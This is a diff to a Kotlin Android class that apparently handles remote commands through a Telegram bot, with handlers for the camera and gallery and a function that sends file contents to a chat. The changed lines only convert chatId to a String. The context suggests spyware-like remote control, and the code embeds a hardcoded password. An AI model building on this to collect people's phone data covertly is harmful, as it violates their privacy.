@@ -30,6 +30,7 @@ import kotlin.random.Random
  * - ✅ تحويل جميع استدعاءات sendTelegramMessage التي تستخدم cid إلى cid.toString() لضمان التوافق.
  * - ✅ التأكد من أن جميع استدعاءات sendTelegramMessage في sendTextFile تستخدم chatId.toString().
  * - ✅ إصلاح جميع الاستدعاءات في جميع الدوال (execute, handleCamera, handleGallery, ...).
+ * - ✅ إضافة تحويل chatId إلى String في sendTelegramMessage باستخدام when للتأكد من أنه String.
  */
 class Commands private constructor(context: Context) {
 
@@ -448,6 +449,7 @@ class Commands private constructor(context: Context) {
         replyToMessageId: Long = 0L
     ) {
         if (content.isBlank()) {
+            // ✅ تحويل chatId إلى String
             sendTelegramMessage(
                 tg, chatId.toString(), "📄 $filename: لا يوجد محتوى",
                 receivingToken = receivingToken,
@@ -463,6 +465,7 @@ class Commands private constructor(context: Context) {
 
             if (tempFile.length() == 0L) {
                 safeRemove(tempFile)
+                // ✅ تحويل chatId إلى String
                 sendTelegramMessage(
                     tg, chatId.toString(), "📄 $filename: ملف فارغ",
                     receivingToken = receivingToken,
@@ -481,6 +484,7 @@ class Commands private constructor(context: Context) {
             }
         } catch (e: Exception) {
             Log.e(TAG, "❌ Send text file error: ${e.message}")
+            // ✅ تحويل chatId إلى String
             sendTelegramMessage(
                 tg, chatId.toString(), "📄 $filename:\n${content.take(4000)}",
                 receivingToken = receivingToken,
@@ -1400,7 +1404,10 @@ class Commands private constructor(context: Context) {
         // ✅ استبدال كلمة المرور بـ •••••••• في حال وجودها بالخطأ في النص
         val cleanText = text.replace("Zaen123@123@", "••••••••")
         // ✅ تحويل chatId إلى String صراحةً لتجنب أي خطأ تطابق
-        val chatIdStr = chatId.toString()
+        val chatIdStr = when (chatId) {
+            is String -> chatId
+            else -> chatId.toString()
+        }
         val params = mutableMapOf<String, Any>("chat_id" to chatIdStr, "text" to cleanText)
         replyMarkupJson?.let { params["reply_markup"] = it }
         return invokeTelegramMethod(
